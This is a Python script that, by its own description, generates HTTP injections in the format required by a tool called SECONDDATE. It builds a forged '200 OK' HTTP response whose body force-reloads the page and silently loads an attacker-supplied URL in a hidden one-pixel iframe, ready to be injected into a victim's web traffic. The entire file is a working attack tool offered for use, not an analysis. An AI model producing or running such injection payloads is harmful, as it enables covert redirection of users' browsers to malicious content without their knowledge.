#!/usr/bin/env python

from optparse import OptionParser, Option, OptionValueError
import sys


def parse_arguments(parser):

    parser.add_option(
        '-o', '--outfile',
        action='store', type='string', dest='outfile',
        help='Output file name (optional). By default the resulting data is written to stdout.')

    return parser.parse_args()


def main():
    description = """
Generates HTTP injections in the format required by SECONDDATE using the
provided URL.
"""

    parser = OptionParser(
        usage='%prog [ ... options ... ] url',
        version='%prog 1.0',
        description=description)

    (options, args) = parse_arguments(parser)

    if len(args) != 1:
        parser.error('url required')

    url = args[0]

    data = '<html><body onload="location.reload(true)"><iframe src="%s" height="1" width="1" scrolling="no" frameborder="0" unselectable="yes" marginheight="0" marginwidth="0"></iframe></body></html>\n' % (url)

    header = 'HTTP/1.1 200 OK\r\nPragma: no-cache\r\nContent-Type: text/html\r\nContent-Length: %d\r\nCache-Control: no-cache,no-store\r\n\r\n' % (len(data))

    output = header + data

    if options.outfile:
        file = open(options.outfile, 'wb')
        file.write(output)
        file.close()
    else:
        sys.stdout.write(output)


if __name__ == '__main__':
    main()

